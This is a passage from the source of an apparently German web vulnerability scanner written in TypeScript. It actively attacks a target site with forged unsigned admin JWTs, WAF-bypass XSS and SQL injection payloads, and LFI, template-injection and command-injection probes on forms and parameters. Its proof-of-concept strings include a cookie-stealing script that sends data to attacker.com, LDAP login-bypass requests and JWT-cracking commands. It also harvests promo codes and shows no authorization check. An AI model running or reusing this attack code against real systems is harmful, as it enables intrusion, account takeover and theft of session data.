                    "1. LDAP-Eingaben escapen (RFC 4515)\n2. Parameterisierte LDAP-Queries\n3. Least-Privilege LDAP Service Account\n4. Input-Validierung gegen Sonderzeichen (*, |, &, (, ))",
                    "https://owasp.org/www-community/attacks/LDAP_Injection",
                    { payload, poc: `curl -v '${testUrl}'\n\n# Auth Bypass:\ncurl -X POST '${baseUrl}/login' -d 'username=admin)(%26)&password=anything'\n\n# Enumerate all users:\ncurl '${link.replace(new RegExp(`${param}=[^&]*`, 'i'), `${param}=*)(uid=*`)}'`, evidence: `LDAP pattern '${matchedPattern}' detected.\nResponse: ${bodySnippet}`, responseSample: bodySnippet }
                  ));
                  break;
                }
              } catch {}
            }
            break;
          }
        }
      }

      // ═══════════════════════════════════════════════════════════════════
      // JWT ATTACK TESTING — ENTERPRISE-GRADE
      // ═══════════════════════════════════════════════════════════════════
      sendLog("JWT Attack Testing — Enterprise...", "JWT");
      // Check if site uses JWT
      try {
        const mainResp = await fetchWithTimeout(url, {}, 5000);
        const mainBody = mainResp.body || '';
        const mainHeaders = mainResp.headers || {};
        const usesJwt = mainBody.includes('jwt') || mainBody.includes('JWT') || mainBody.includes('Bearer') ||
          mainBody.includes('eyJ') || Object.values(mainHeaders).some((v: any) => typeof v === 'string' && v.includes('eyJ'));
        
        if (usesJwt) {
          // Test Algorithm None attack
          const noneToken = Buffer.from(JSON.stringify({alg:"none",typ:"JWT"})).toString('base64url') + '.' + Buffer.from(JSON.stringify({admin:true,role:"admin"})).toString('base64url') + '.';
          const apiPaths = ['/api', '/api/admin', '/api/user', '/api/profile', '/dashboard', '/admin', '/api/v1', '/api/v2'];
          for (const apiPath of apiPaths) {
            try {
              const apiUrl = `${baseUrl}${apiPath}`;
              const resp = await fetchWithTimeout(apiUrl, {
                headers: { 'Authorization': `Bearer ${noneToken}` },
              }, 5000);
              const respBody = resp.body || '';
              const bodySnippet = respBody.substring(0, 500);
              if (resp.status === 200 && respBody.length > 50 && !respBody.includes("unauthorized") && !respBody.includes("invalid")) {
                sendLog(`⚠ JWT ALGORITHM NONE ATTACK: ${apiUrl}`, "JWT");
                vulnerabilities.push(createProfessionalVuln(
                  "jwt_attack", "critical", apiUrl,
                  `JWT ALGORITHM NONE ATTACK — Server akzeptiert unsignierte Tokens`,
                  "Server validiert JWT-Signatur nicht — ermoglicht Authentication Bypass, Privilege Escalation und vollstandigen Account Takeover",
                  "1. JWT-Bibliothek aktualisieren\n2. Algorithmus-Whitelist (RS256 only)\n3. Signatur IMMER validieren\n4. alg:none EXPLIZIT ablehnen\n5. Asymmetrische Signierung (RS256/ES256)",
                  "https://portswigger.net/web-security/jwt/algorithm-confusion",
                  { payload: noneToken, poc: `# Algorithm None Attack:\necho -n '{"alg":"none","typ":"JWT"}.{"admin":true,"role":"admin"}.' | base64 | curl -v '${apiUrl}' -H "Authorization: Bearer <token>"\n\n# JWT Crack (weak secrets):\njohn jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256\nhashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt`, evidence: `Server accepted unsigned JWT (alg:none) at ${apiPath}.\nResponse: ${bodySnippet}`, responseSample: bodySnippet }
                ));
                break;
              }
            } catch {}
          }

          // Test weak secret with common passwords  
          const weakSecrets = ["secret", "password", "123456", "admin", "key", "jwt_secret", "changeme", "test"];
          sendLog("JWT Weak Secret Testing...", "JWT");
          // Just report that JWT is in use for further investigation
          vulnerabilities.push(createProfessionalVuln(
            "jwt_attack", "medium", url,
            `JWT TOKEN DETECTED — Manuelle Prufung auf schwache Secrets empfohlen`,
            "JWT-basierte Authentifizierung erkannt. Schwache Signing-Secrets ermoglichen Token-Falsching",
            "1. Starkes Secret (>256 bit)\n2. RS256 statt HS256\n3. Token-Rotation\n4. Kurze Ablaufzeiten (15min access, 7d refresh)\n5. Token-Blacklisting bei Logout",
            "https://portswigger.net/web-security/jwt",
            { poc: `# JWT found in application. Test with:\njwt_tool ${url} -t -S\n\n# Common weak secrets to test:\n${weakSecrets.join(', ')}\n\n# Decode token:\necho "<token>" | cut -d. -f2 | base64 -d | python -m json.tool`, evidence: `JWT usage detected in application (Bearer tokens, eyJ... patterns)` }
          ));
        }
      } catch {}

      // ═══════════════════════════════════════════════════════════════════
      // WAF BYPASS TESTING — ENTERPRISE-GRADE
      // ═══════════════════════════════════════════════════════════════════
      sendLog("WAF Bypass Testing — Enterprise...", "WAF");
      const wafBypassPayloads = [
        // XSS WAF bypasses
        { payload: '<img/src=x onerror=alert(1)>', type: 'xss', desc: 'Tag attribute space bypass' },
        { payload: '<svg/onload=alert(1)>', type: 'xss', desc: 'SVG event handler' },
        { payload: '"><img src=x onerror=prompt(1)>', type: 'xss', desc: 'prompt() statt alert()' },
        { payload: '<details/open/ontoggle=alert(1)>', type: 'xss', desc: 'HTML5 ontoggle' },
        { payload: '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1">', type: 'xss', desc: 'Nested HTML5 bypass' },
        { payload: String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62), type: 'xss', desc: 'CharCode bypass' },
        // SQLi WAF bypasses
        { payload: "1' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--", type: 'sqli', desc: 'MySQL comment bypass' },
        { payload: "1' Un/**/ION Se/**/LeCT 1,2,3--", type: 'sqli', desc: 'Inline comment bypass' },
        { payload: "1' %55nion %53elect 1,2,3--", type: 'sqli', desc: 'URL encoding bypass' },
        { payload: "1' uNiOn aLl sElEcT 1,2,3--", type: 'sqli', desc: 'Case variation bypass' },
        { payload: "1'||'1'='1", type: 'sqli', desc: 'String concat bypass' },
      ];
      let wafDetected = false;
      for (const link of allParamLinks.slice(0, 10)) {
        for (const wafTest of wafBypassPayloads) {
          try {
            const testUrl = link.replace(/=([^&]*)/g, `=${encodeURIComponent(wafTest.payload)}`);
            const resp = await fetchWithTimeout(testUrl, {}, 6000);
            const respBody = resp.body || '';
            const bodySnippet = respBody.substring(0, 500);
            // Check if WAF blocked
            const wafBlocked = resp.status === 403 || resp.status === 406 || resp.status === 429 ||
              respBody.includes("blocked") || respBody.includes("forbidden") || respBody.includes("WAF") ||
              respBody.includes("ModSecurity") || respBody.includes("Cloudflare") || respBody.includes("AWS WAF");
            // Check if bypass worked
            const payloadReflected = respBody.includes(wafTest.payload) || respBody.includes("alert(1)") || respBody.includes("error in your SQL");
            
            if (wafBlocked && !wafDetected) {
              wafDetected = true;
              sendLog(`WAF detected (${resp.status})`, "WAF");
            }
            if (payloadReflected && !wafBlocked) {
              sendLog(`⚠ WAF BYPASS: ${wafTest.desc} worked!`, "WAF");
              vulnerabilities.push(createProfessionalVuln(
                "waf_bypass", "critical", link,
                `WAF BYPASS — ${wafTest.type.toUpperCase()} payload umgeht WAF: ${wafTest.desc}`,
                "Web Application Firewall kann mit speziellen Encoding-Techniken umgangen werden — Angriffe (SQLi, XSS) sind trotz WAF moglich",
                "1. WAF-Regeln aktualisieren\n2. Positive Security Model (Whitelist)\n3. Multiple WAF-Layer\n4. Request-Normalisierung vor WAF-Check\n5. Encoding-Dekodierung in WAF aktivieren",
                "https://owasp.org/www-community/Web_Application_Firewall",
                { payload: wafTest.payload, poc: `# WAF Bypass (${wafTest.desc}):\ncurl -v '${testUrl}'\n\n# Double URL encoding:\ncurl -v '${link.replace(/=([^&]*)/g, `=${encodeURIComponent(encodeURIComponent(wafTest.payload))}`)}'`, evidence: `WAF bypass successful with ${wafTest.desc}.\nPayload reflected/executed despite WAF.\nResponse: ${bodySnippet}`, responseSample: bodySnippet }
              ));
            }
          } catch {}
        }
      }
      if (url.startsWith("https")) {
        sendLog("TLS-Konfiguration wird gepruft...", "TLS");
        try {
          const tlsSocket = tls.connect({
            host: parsedUrl.hostname,
            port: 443,
            rejectUnauthorized: false,
            servername: parsedUrl.hostname,
          });
          await new Promise<void>((resolve, reject) => {
            tlsSocket.on('secureConnect', () => {
              const cert = tlsSocket.getPeerCertificate();
              const protocol = tlsSocket.getProtocol();
              const cipher = tlsSocket.getCipher();
              
              // Check for weak protocols
              if (protocol && ['TLSv1', 'SSLv3', 'TLSv1.1'].includes(protocol)) {
                vulnerabilities.push(createProfessionalVuln(
                  "weak_encryption", "high", url,
                  `Schwaches TLS-Protokoll: ${protocol}`,
                  "Veraltete TLS-Protokolle sind anfällig fur BEAST, POODLE und CRIME Angriffe",
                  "TLS 1.2+ erzwingen, SSLv3/TLS1.0/1.1 deaktivieren",
                  "https://owasp.org/www-project-web-security-testing-guide/",
                  { evidence: `Protocol: ${protocol}, Cipher: ${cipher?.name}` }
                ));
              }
              
              // Check certificate expiry
              if (cert.valid_to) {
                const expiryDate = new Date(cert.valid_to);
                const daysUntilExpiry = Math.floor((expiryDate.getTime() - Date.now()) / (1000 * 60 * 60 * 24));
                if (daysUntilExpiry < 0) {
                  vulnerabilities.push(createProfessionalVuln(
                    "weak_encryption", "high", url,
                    `SSL-Zertifikat ABGELAUFEN seit ${Math.abs(daysUntilExpiry)} Tagen`,
                    "Abgelaufene Zertifikate ermoglichen Man-in-the-Middle-Angriffe",
                    "SSL-Zertifikat erneuern (Let's Encrypt: certbot renew)",
                    "https://owasp.org/www-project-web-security-testing-guide/",
                    { evidence: `Expired: ${cert.valid_to}` }
                  ));
                } else if (daysUntilExpiry < 30) {
                  vulnerabilities.push(createProfessionalVuln(
                    "weak_encryption", "medium", url,
                    `SSL-Zertifikat lauft in ${daysUntilExpiry} Tagen ab`,
                    "Bald ablaufendes Zertifikat muss erneuert werden",
                    "SSL-Zertifikat rechtzeitig erneuern, Auto-Renewal einrichten",
                    "https://owasp.org/www-project-web-security-testing-guide/",
                    { evidence: `Expires: ${cert.valid_to}` }
                  ));
                }
              }
              
              tlsSocket.destroy();
              resolve();
            });
            tlsSocket.on('error', () => { tlsSocket.destroy(); resolve(); });
            setTimeout(() => { tlsSocket.destroy(); resolve(); }, 5000);
          });
        } catch {}
      }

      sendLog(`Phase 16 abgeschlossen: ${vulnerabilities.length} Schwachstellen gefunden`, "VULN");

      // ═══════════════════════════════════════════════════════════════════
      // PHASE 17: FORM VULNERABILITY TESTING ON CRAWLED PAGES (ENTERPRISE-GRADE)
      // ═══════════════════════════════════════════════════════════════════
      if (siteStructure && siteStructure.allForms.length > 0) {
        sendEvent("phase", { phase: 17, name: "Formular-Schwachstellen (Enterprise)", status: "active" });
        sendLog("════════════════════════════════════════════════════════════", "FORM");
        sendLog("FORMULAR-TESTS (ENTERPRISE) — DEEP PAYLOAD TESTING!", "FORM");
        sendLog("════════════════════════════════════════════════════════════", "FORM");
        
        const formsToTest = siteStructure.allForms.slice(0, 15);
        sendLog(`Teste ${formsToTest.length} Formulare mit Enterprise-Payloads...`, "FORM");
        
        for (const form of formsToTest) {
          sendLog(`Teste Formular: ${form.method} ${form.action}`, "FORM");
          
          for (const input of form.inputs.slice(0, 8)) {
            if (input.type === 'hidden' || input.type === 'submit' || input.type === 'button') continue;
            
            // SQL Injection test on form (expanded)
            for (const payload of SQL_PAYLOADS.slice(0, 12)) {
              try {
                const formUrl = form.action.startsWith('http') ? form.action : `${baseUrl}${form.action}`;
                if (form.method === 'GET') {
                  const testUrl = `${formUrl}?${input.name}=${encodeURIComponent(payload)}`;
                  const resp = await fetchWithTimeout(testUrl, {}, 5000);
                  const respBody = resp.body || '';
                  const bodySnippet = respBody.substring(0, 500);
                  if (respBody.toLowerCase().includes("sql") || respBody.toLowerCase().includes("syntax") || respBody.toLowerCase().includes("mysql") || respBody.toLowerCase().includes("ora-") || respBody.toLowerCase().includes("postgresql") || respBody.toLowerCase().includes("sqlite")) {
                    sendLog(`⚠ SQL-INJECTION IN FORMULAR: ${formUrl} (${input.name})`, "FORM");
                    const fieldContext = getFieldRiskContext(input.name, "sql");
                    vulnerabilities.push(createProfessionalVuln(
                      "sql_injection", "critical", formUrl,
                      `SQL INJECTION in Form Field '${input.name}' - ${fieldContext.risk}`,
                      `The form field '${input.name}' on page ${formUrl} is vulnerable to SQL Injection. ${fieldContext.impact} Attackers can extract entire database contents, bypass authentication, modify data, or execute system commands.`,
                      "1. Use Prepared Statements with parameterized queries\n2. Use ORM frameworks (Eloquent, Doctrine, Hibernate)\n3. Implement strict input validation with whitelists\n4. Apply least privilege to database accounts",
                      "https://owasp.org/www-community/attacks/SQL_Injection",
                      { payload, poc: `curl -v "${testUrl}"\n\n# SQLMap:\nsqlmap -u "${formUrl}?${input.name}=test" -p ${input.name} --batch --dbs`, evidence: `Database error detected with payload "${payload}" in field '${input.name}'.\nResponse: ${bodySnippet}`, responseSample: bodySnippet }
                    ));
                    break;
                  }
                } else {
                  // POST form
                  const body = `${input.name}=${encodeURIComponent(payload)}`;
                  const resp = await fetchWithTimeout(formUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: body,
                  }, 5000);
                  const respBody = resp.body || '';
                  const bodySnippet = respBody.substring(0, 500);
                  if (respBody.toLowerCase().includes("sql") || respBody.toLowerCase().includes("syntax") || respBody.toLowerCase().includes("mysql") || respBody.toLowerCase().includes("ora-") || respBody.toLowerCase().includes("postgresql")) {
                    sendLog(`⚠ SQL-INJECTION (POST): ${formUrl} (${input.name})`, "FORM");
                    const fieldContext = getFieldRiskContext(input.name, "sql");
                    vulnerabilities.push(createProfessionalVuln(
                      "sql_injection", "critical", formUrl,
                      `SQL INJECTION in POST Form '${input.name}' - ${fieldContext.risk}`,
                      `POST form field '${input.name}' at ${formUrl} vulnerable to SQL Injection. ${fieldContext.impact}`,
                      "1. Prepared Statements\n2. ORM Framework\n3. Input Validation\n4. WAF Rules",
                      "https://owasp.org/www-community/attacks/SQL_Injection",
                      { payload, poc: `curl -X POST '${formUrl}' -d '${input.name}=${encodeURIComponent(payload)}'`, evidence: `SQL error in POST form.\nResponse: ${bodySnippet}`, responseSample: bodySnippet }
                    ));
                    break;
                  }
                }
              } catch {}
            }
            
            // XSS test on form (expanded)
            for (const payload of XSS_PAYLOADS.slice(0, 10)) {
              try {
                const formUrl = form.action.startsWith('http') ? form.action : `${baseUrl}${form.action}`;
                if (form.method === 'GET') {
                  const testUrl = `${formUrl}?${input.name}=${encodeURIComponent(payload)}`;
                  const resp = await fetchWithTimeout(testUrl, {}, 5000);
                  const respBody = resp.body || '';
                  if (respBody.includes(payload) || respBody.includes("<script>") || respBody.includes("onerror")) {
                    sendLog(`⚠ XSS IN FORMULAR: ${formUrl} (${input.name})`, "FORM");
                    const fieldContext = getFieldRiskContext(input.name, "xss");
                    vulnerabilities.push(createProfessionalVuln(
                      "xss", "high", formUrl,
                      `REFLECTED XSS in Form Field '${input.name}' - ${fieldContext.risk}`,
                      `Form field '${input.name}' reflects input without sanitization. ${fieldContext.impact}`,
                      "1. HTML encode output\n2. CSP headers\n3. HttpOnly cookies\n4. Framework auto-escaping",
                      "https://owasp.org/www-community/attacks/xss/",
                      { payload, poc: `curl -v "${testUrl}"\n\n# Cookie Steal:\n<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>`, evidence: `XSS payload reflected in form field '${input.name}'` }
                    ));
                    break;
                  }
                } else {
                  const body = `${input.name}=${encodeURIComponent(payload)}`;
                  const resp = await fetchWithTimeout(formUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: body,
                  }, 5000);
                  const respBody = resp.body || '';
                  if (respBody.includes(payload) || respBody.includes("<script>") || respBody.includes("onerror")) {
                    sendLog(`⚠ XSS (POST): ${formUrl} (${input.name})`, "FORM");
                    vulnerabilities.push(createProfessionalVuln(
                      "xss", "high", formUrl,
                      `STORED/REFLECTED XSS in POST Form '${input.name}'`,
                      `POST form field '${input.name}' at ${formUrl} reflects/stores XSS payload`,
                      "1. HTML encode\n2. CSP\n3. DOMPurify\n4. HttpOnly cookies",
                      "https://owasp.org/www-community/attacks/xss/",
                      { payload, poc: `curl -X POST '${formUrl}' -d '${input.name}=${encodeURIComponent(payload)}'`, evidence: `XSS payload reflected in POST response` }
                    ));
                    break;
                  }
                }
              } catch {}
            }

            // SSTI test on form
            for (const sstiPayload of SSTI_PAYLOADS.slice(0, 5)) {
              try {
                const formUrl = form.action.startsWith('http') ? form.action : `${baseUrl}${form.action}`;
                const body = form.method === 'GET' ? null : `${input.name}=${encodeURIComponent(sstiPayload)}`;
                const testUrl = form.method === 'GET' ? `${formUrl}?${input.name}=${encodeURIComponent(sstiPayload)}` : formUrl;
                const resp = await fetchWithTimeout(testUrl, form.method === 'POST' ? {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                  body: body,
                } : {}, 5000);
                const respBody = resp.body || '';
                if (respBody.includes("49") || respBody.includes("7777777") || respBody.includes("49") || respBody.includes("{7*7}")) {
                  sendLog(`⚠ SSTI IN FORM: ${formUrl} (${input.name})`, "FORM");
                  vulnerabilities.push(createProfessionalVuln(
                    "ssti", "critical", formUrl,
                    `SSTI in Form Field '${input.name}' — Template Engine Injection`,
                    "Server-Side Template Injection in Formularen ermoglicht Remote Code Execution",
                    "1. User-Input nie direkt in Templates\n2. Sandbox fur Template Engine\n3. Logicless Templates (Mustache)",
                    "https://portswigger.net/web-security/server-side-template-injection",
                    { payload: sstiPayload, poc: `curl -X ${form.method} '${testUrl}'${body ? ` -d '${body}'` : ''}`, evidence: `Template expression evaluated in form field '${input.name}'` }
                  ));
                  break;
                }
              } catch {}
            }

            // CMD Injection test on form
            for (const cmdPayload of CMD_PAYLOADS.slice(0, 5)) {
              try {
                const formUrl = form.action.startsWith('http') ? form.action : `${baseUrl}${form.action}`;
                const body = form.method === 'GET' ? null : `${input.name}=${encodeURIComponent(cmdPayload)}`;
                const testUrl = form.method === 'GET' ? `${formUrl}?${input.name}=${encodeURIComponent(cmdPayload)}` : formUrl;
                const resp = await fetchWithTimeout(testUrl, form.method === 'POST' ? {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                  body: body,
                } : {}, 5000);
                const respBody = resp.body || '';
                if (respBody.includes("root:") || respBody.includes("uid=") || respBody.includes("www-data") || respBody.includes("WINDOWS") || respBody.includes("volume serial")) {
                  sendLog(`⚠ CMD INJECTION IN FORM: ${formUrl} (${input.name})`, "FORM");
                  vulnerabilities.push(createProfessionalVuln(
                    "command_injection", "critical", formUrl,
                    `COMMAND INJECTION in Form Field '${input.name}'`,
                    "OS Command Injection uber Formular ermoglicht vollstandige Server-Ubernahme",
                    "1. Keine Shell-Befehle mit User-Input\n2. Input-Sanitization\n3. Parameterisierte Befehle",
                    "https://owasp.org/www-community/attacks/Command_Injection",
                    { payload: cmdPayload, poc: `curl -X ${form.method} '${testUrl}'`, evidence: `OS command output in form response` }
                  ));
                  break;
                }
              } catch {}
            }
          }
        }
        sendLog(`Formular-Tests (Enterprise) abgeschlossen`, "FORM");
      }

      // ═══════════════════════════════════════════════════════════════════
      // PHASE 18: CRAWLED PAGE PARAMETER TESTING (ENTERPRISE-GRADE)
      // ═══════════════════════════════════════════════════════════════════
      if (siteStructure && siteStructure.allParameters.size > 0) {
        sendEvent("phase", { phase: 18, name: "Parameter-Tests (Enterprise)", status: "active" });
        sendLog("════════════════════════════════════════════════════════════", "PARAM");
        sendLog("PARAMETER-TESTS (ENTERPRISE) — MULTI-VULN DEEP SCAN!", "PARAM");
        sendLog("════════════════════════════════════════════════════════════", "PARAM");
        
        const paramsToTest = Array.from(siteStructure.allParameters).slice(0, 25);
        const pagesToTest = siteStructure.pages.filter(p => p.links.length > 0).slice(0, 8);
        
        sendLog(`Teste ${paramsToTest.length} Parameter auf ${pagesToTest.length} Seiten...`, "PARAM");
        
        for (const page of pagesToTest) {
          for (const param of paramsToTest) {
            // SQL Injection on parameters (expanded)
            for (const payload of SQL_PAYLOADS.slice(0, 10)) {
              try {
                const testUrl = `${page.url}?${param}=${encodeURIComponent(payload)}`;
                const resp = await fetchWithTimeout(testUrl, {}, 5000);
                const respBody = resp.body || '';
                const bodySnippet = respBody.substring(0, 500);
                if (respBody.toLowerCase().includes("sql") || respBody.toLowerCase().includes("syntax") || respBody.toLowerCase().includes("mysql") || respBody.toLowerCase().includes("postgresql") || respBody.toLowerCase().includes("ora-") || respBody.toLowerCase().includes("sqlite")) {
                  sendLog(`⚠ SQLi: ${page.url} (${param})`, "PARAM");
                  const fieldContext = getFieldRiskContext(param, "sql");
                  vulnerabilities.push(createProfessionalVuln(
                    "sql_injection", "critical", testUrl,
                    `SQL INJECTION via URL Parameter '${param}' - ${fieldContext.risk}`,
                    `${fieldContext.impact} The parameter '${param}' on ${page.url} directly incorporates user input into SQL queries.`,
                    "1. Prepared Statements\n2. Input Validation\n3. ORM Framework\n4. DB Least Privilege\n5. WAF Rules",
                    "https://owasp.org/www-community/attacks/SQL_Injection",
                    { payload, poc: `curl -v "${testUrl}"\n\nsqlmap -u "${page.url}?${param}=test" -p ${param} --batch --dbs`, evidence: `SQL error with payload "${payload}" in '${param}'.\nResponse: ${bodySnippet}`, responseSample: bodySnippet }
                  ));
                  break;
                }
              } catch {}
            }
            
            // XSS on parameters (expanded)
            for (const payload of XSS_PAYLOADS.slice(0, 8)) {
              try {
                const testUrl = `${page.url}?${param}=${encodeURIComponent(payload)}`;
                const resp = await fetchWithTimeout(testUrl, {}, 5000);
                const respBody = resp.body || '';
                if (respBody.includes(payload)) {
                  sendLog(`⚠ XSS: ${page.url} (${param})`, "PARAM");
                  vulnerabilities.push(createProfessionalVuln(
                    "xss", "high", testUrl,
                    `REFLECTED XSS via URL Parameter '${param}'`,
                    `Parameter '${param}' reflects input without encoding.`,
                    "1. HTML encode\n2. CSP\n3. HttpOnly\n4. Auto-escaping",
                    "https://owasp.org/www-community/attacks/xss/",
                    { payload, poc: `curl -v "${testUrl}"\n\n# Session steal:\n${param}=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>`, evidence: `XSS payload reflected in '${param}'` }
                  ));
                  break;
                }
              } catch {}
            }

            // LFI on parameters
            for (const payload of LFI_PAYLOADS.slice(0, 5)) {
              try {
                const testUrl = `${page.url}?${param}=${encodeURIComponent(payload)}`;
                const resp = await fetchWithTimeout(testUrl, {}, 5000);
                const respBody = resp.body || '';
                if (respBody.includes("root:") || respBody.includes("daemon:") || respBody.includes("[fonts]") || respBody.includes("www-data")) {
                  sendLog(`⚠ LFI: ${page.url} (${param})`, "PARAM");
                  vulnerabilities.push(createProfessionalVuln(
                    "lfi", "critical", testUrl,
                    `LFI via Parameter '${param}' — Local File Read`,
                    `Parameter '${param}' allows reading server files.`,
                    "1. Input Whitelist\n2. chroot\n3. No user input in file paths",
                    "https://owasp.org/www-project-web-security-testing-guide/",
                    { payload, poc: `curl -v "${testUrl}"`, evidence: `Server file content in response` }
                  ));
                  break;
                }
              } catch {}
            }

            // SSTI on parameters
            for (const payload of SSTI_PAYLOADS.slice(0, 3)) {
              try {
                const testUrl = `${page.url}?${param}=${encodeURIComponent(payload)}`;
                const resp = await fetchWithTimeout(testUrl, {}, 5000);
                const respBody = resp.body || '';
                if (respBody.includes("49") || respBody.includes("7777777")) {
                  sendLog(`⚠ SSTI: ${page.url} (${param})`, "PARAM");
                  vulnerabilities.push(createProfessionalVuln(
                    "ssti", "critical", testUrl,
                    `SSTI via Parameter '${param}' — Template Injection`,
                    `Template engine evaluates expressions from '${param}'.`,
                    "1. Sandbox templates\n2. No user input in templates\n3. Logicless templates",
                    "https://portswigger.net/web-security/server-side-template-injection",
                    { payload, poc: `curl -v "${testUrl}"`, evidence: `Template expression evaluated via '${param}'` }
                  ));
                  break;
                }
              } catch {}
            }

            // CMD Injection on parameters
            for (const payload of CMD_PAYLOADS.slice(0, 3)) {
              try {
                const testUrl = `${page.url}?${param}=${encodeURIComponent(payload)}`;
                const resp = await fetchWithTimeout(testUrl, {}, 5000);
                const respBody = resp.body || '';
                if (respBody.includes("root:") || respBody.includes("uid=") || respBody.includes("www-data") || respBody.includes("WINDOWS")) {
                  sendLog(`⚠ CMD INJECTION: ${page.url} (${param})`, "PARAM");
                  vulnerabilities.push(createProfessionalVuln(
                    "command_injection", "critical", testUrl,
                    `COMMAND INJECTION via Parameter '${param}'`,
                    `OS command execution via '${param}'.`,
                    "1. No shell exec with user input\n2. Input sanitization\n3. Parameterized commands",
                    "https://owasp.org/www-community/attacks/Command_Injection",
                    { payload, poc: `curl -v "${testUrl}"`, evidence: `OS command output via '${param}'` }
                  ));
                  break;
                }
              } catch {}
            }
          }
        }
        sendLog(`Parameter-Tests (Enterprise) abgeschlossen`, "PARAM");
      }

      // ═══════════════════════════════════════════════════════════════════
      // PHASE 19: ENDPOINT VULNERABILITY TESTING
      // ═══════════════════════════════════════════════════════════════════
      if (siteStructure && siteStructure.allEndpoints.size > 0) {
        sendEvent("phase", { phase: 19, name: "Endpoint-Tests", status: "active" });
        sendLog("API-Endpoints werden auf Schwachstellen getestet...", "API");
        
        const endpointsToTest = Array.from(siteStructure.allEndpoints).slice(0, 10);
        for (const endpoint of endpointsToTest) {
          sendLog(`Teste Endpoint: ${endpoint}`, "API");
          
          // Test for unauthorized access
          try {
            const resp = await fetchWithTimeout(endpoint, {}, 5000);
            if (resp.status === 200) {
              sendLog(`✓ Endpoint erreichbar: ${endpoint} [${resp.status}]`, "API");
              
              // Check if it returns sensitive data without auth
              if (resp.body.includes("password") || resp.body.includes("token") || resp.body.includes("secret") || resp.body.includes("api_key")) {
                sendLog(`⚠ SENSITIVE DATEN: ${endpoint}`, "API");
                vulnerabilities.push({
                  id: randomUUID(),
                  type: "information_disclosure",
                  severity: "high",
                  url: endpoint,
                  description: "API-Endpoint gibt sensitive Daten preis",
                  why: "Ungeschutzte API-Endpoints konnen Daten leaken",
                  solution: "API-Authentifizierung implementieren",
                  timestamp: new Date().toISOString(),
                });
              }
            }
          } catch {}
        }
      }

      // ═══════════════════════════════════════════════════════════════════
      // PHASE 20: FINALIZATION
      // ═══════════════════════════════════════════════════════════════════
      sendEvent("phase", { phase: 20, name: "Abschluss", status: "active" });
      
      const scanDuration = ((Date.now() - startTime) / 1000).toFixed(2);
      
      sendLog("════════════════════════════════════════════════════════════", "TEUFEL");
      sendLog("SCAN VOLLSTANDIG ABGESCHLOSSEN - KEINE GRENZEN!", "TEUFEL");
      sendLog("════════════════════════════════════════════════════════════", "TEUFEL");
      sendLog(`Dauer: ${scanDuration}s`, "TEUFEL");
      sendLog(`Schwachstellen gefunden: ${vulnerabilities.length}`, "TEUFEL");
      sendLog(`Admin-Panels: ${adminPanels.length}`, "TEUFEL");
      sendLog(`Backup-Dateien: ${backupFiles.length}`, "TEUFEL");
      sendLog(`Sensitive Dateien: ${sensitiveFiles.length}`, "TEUFEL");
      sendLog(`Offene Ports: ${openPorts.length}`, "TEUFEL");
      sendLog(`Subdomains: ${subdomains.length}`, "TEUFEL");
      sendLog(`JS-Dateien analysiert: ${jsFilesAnalyzed.length}`, "TEUFEL");
      sendLog(`JS-Endpoints entdeckt: ${jsEndpointsDiscovered.size}`, "TEUFEL");
      sendLog(`Promo-Codes entdeckt: ${promoCodesDiscovered.size}`, "TEUFEL");
      sendLog(`Shine-Codes entdeckt: ${shineCodesDiscovered.size}`, "TEUFEL");
      if (siteStructure) {
        sendLog(`Seiten gecrawlt: ${siteStructure.pages.length}`, "TEUFEL");
        sendLog(`Formulare gefunden: ${siteStructure.allForms.length}`, "TEUFEL");
        sendLog(`Endpoints entdeckt: ${siteStructure.allEndpoints.size}`, "TEUFEL");
      }

      const scopeChecklist = buildScopeChecklist({
        subdomains: subdomains.length,
        dnsRecords: dnsRecords.length,
        ipAddresses: (techStack["Real IP"] || []).length,
        wafDetected: protections.length,
        apiEndpoints: siteStructure ? siteStructure.allEndpoints.size : 0,
        jsFiles: jsFilesAnalyzed.length,
        jsEndpoints: jsEndpointsDiscovered.size,
        parameters: (siteStructure ? siteStructure.allParameters.size : 0) + jsParametersDiscovered.size,
        backupFiles: backupFiles.length,
        sensitiveFiles: sensitiveFiles.length,
        adminPanels: adminPanels.length,
        directories: foldersFound.length + directories.length,
        openPorts: openPorts.length,
        cloudFindings: cloudBuckets.length,
        promoCodes: promoCodesDiscovered.size,
        shineCodes: shineCodesDiscovered.size,
      });

      // Build server info
      const serverInfo = {
        server: headers["server"] || "Unknown",
        poweredBy: headers["x-powered-by"] || "Unknown",
        contentType: headers["content-type"] || "Unknown",
        url: parsedUrl.hostname,
        port: parseInt(parsedUrl.port) || (parsedUrl.protocol === "https:" ? 443 : 80),
        ip: techStack["Real IP"]?.[0] || undefined,
      };

      // Build server headers list
      const serverHeaders: { name: string; value: string }[] = [];
      for (const [key, value] of Object.entries(headers)) {
        if (typeof value === "string") {
          serverHeaders.push({ name: key, value });
        }
      }

      // Send final result
      const result = {
        id: scanId,
        targetUrl: url,
        timestamp: new Date().toISOString(),
        duration: `${scanDuration}s`,
        status: mainResponse.status,
        serverHeaders,
        serverInfo,
        wafDetected: protections,
        techStack,
        vulnerabilities,
        linksFound,
        formsFound,
        foldersFound,
        adminPanels,
        backupFiles,
        sensitiveFiles,
        scanPhases,
        openPorts,
        dnsRecords,
        sslCertificate: sslCertificate || undefined,
        subdomains,
        directories,
        waybackUrls,
        whoisInfo: whoisInfo || undefined,
        cmsInfo: cmsInfo || undefined,
        takeoverResults,
        cloudBuckets,
        jsIntel: {
          filesAnalyzed: jsFilesAnalyzed,
          endpointsDiscovered: Array.from(jsEndpointsDiscovered),
          parametersDiscovered: Array.from(jsParametersDiscovered),
          sensitiveSignals: Array.from(jsSensitiveSignals),
        },
        promoCodes: Array.from(promoCodesDiscovered),
        shineCodes: Array.from(shineCodesDiscovered),
        scopeChecklist,
        crawlStats: siteStructure ? {
